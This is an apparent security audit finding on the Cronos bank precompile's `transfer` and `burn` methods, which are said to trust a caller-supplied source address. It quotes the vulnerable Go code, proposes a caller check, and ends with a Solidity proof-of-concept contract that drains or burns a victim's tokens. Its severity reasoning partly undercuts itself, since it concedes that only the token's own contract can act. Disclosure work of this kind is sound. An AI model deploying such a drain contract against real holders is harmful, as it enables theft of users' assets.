### Title
Unauthenticated `sender` Argument in Bank Precompile `transfer` and `burn` Allows Any Contract to Drain or Destroy Arbitrary Holders' `evm/<contract>` Native Tokens — (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer` and `burn` methods accept a `sender`/`recipient` address as a caller-supplied ABI argument and use it directly as the source of funds, without verifying it matches the actual EVM transaction originator or the precompile caller. Any deployed contract can invoke these methods with an arbitrary victim address and drain or destroy that victim's `evm/<callerContract>` native bank-module tokens.

---

### Finding Description

`BankContract.Run` in `x/cronos/keeper/precompiles/bank.go` handles three methods: `mint`, `burn`, and `transfer`. The denom for all three is correctly scoped to the calling contract via `EVMDenom(contract.Caller())`, but the *source address* for `burn` and `transfer` is taken directly from the ABI-decoded input arguments with no ownership check:

**`transfer` path** (lines 175–200):
```go
sender := args[0].(common.Address)          // attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
from := sdk.AccAddress(sender.Bytes())       // no check: sender == contract.Caller()?
to := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

**`burn` path** (lines 121–155):
```go
recipient := args[0].(common.Address)        // attacker-controlled burn target
addr := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
```

There is no guard of the form `if sender != contract.Caller() { return error }` or any equivalent check. The precompile trusts the caller-supplied address as the authorised source of funds. [1](#0-0) [2](#0-1) 

---

### Impact Explanation

`evm/<contract>` tokens are native Cosmos bank-module coins that represent the on-chain counterpart of a CRC20/CRC21 EVM token. Users accumulate them through IBC conversion (`ConvertVouchersToEvmCoins`) or direct `moveToNative`-style calls. Once a user holds a balance of `evm/<contractAddress>`, any contract deployed at `contractAddress` can:

1. **Steal** — call `bankPrecompile.transfer(victimAddress, attackerAddress, balance)` to move the victim's entire `evm/<contract>` balance to the attacker.
2. **Destroy** — call `bankPrecompile.burn(victimAddress, balance)` to permanently destroy the victim's tokens.

This is an **unauthorized transfer/burn of CRC20/EVM-denom assets**, matching the Critical/High impact scope (unauthorized transfer, burn, or balance change for CRC20/ERC20/precompile-controlled assets). [3](#0-2) 

---

### Likelihood Explanation

- The bank precompile is a live, registered precompile reachable by any EVM contract via a static call to address `0x0000000000000000000000000000000000000064`.
- The attacker only needs to deploy a contract and call the precompile — no privileged keys, no admin access, no leaked secrets.
- Any user who has converted IBC vouchers or interacted with a CRC20 that uses the bank precompile's native-token bridge holds `evm/<contract>` tokens and is at risk.
- The `evm/` denom is scoped to the calling contract, so the attacker must be the contract whose denom the victim holds — but this is trivially satisfied for any legitimate CRC20 contract that has been deployed and used. [4](#0-3) 

---

### Recommendation

In both `transfer` and `burn`, validate that the `sender`/`recipient` (source-of-funds address) equals the actual EVM caller:

```go
// transfer
if sender != contract.Caller() {
    return nil, errors.New("sender must be the caller")
}

// burn
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the caller")
}
```

This mirrors the pattern already used correctly in the ICA and relayer precompiles, where `caller := contract.Caller()` is used as the authoritative identity for all state-mutating operations. [5](#0-4) [6](#0-5)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address target, uint256 amount) external returns (bool);
}

contract DrainAttack {
    IBankPrecompile constant bank = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Drain victim's evm/<address(this)> tokens to attacker
    function drain(address victim, address attacker, uint256 amount) external {
        // No ownership check in the precompile — succeeds as long as victim has balance
        bank.transfer(victim, attacker, amount);
    }

    // Destroy victim's evm/<address(this)> tokens
    function destroy(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

1. Attacker deploys `DrainAttack` at address `A`.
2. Victim holds `evm/A` tokens (e.g., obtained via IBC conversion or `moveToNative`).
3. Attacker calls `DrainAttack.drain(victimAddress, attackerAddress, victimBalance)`.
4. The bank precompile executes `SendCoins(victimAddress → attackerAddress, evm/A)` with no authorization check.
5. Victim's entire `evm/A` balance is transferred to the attacker. [7](#0-6)
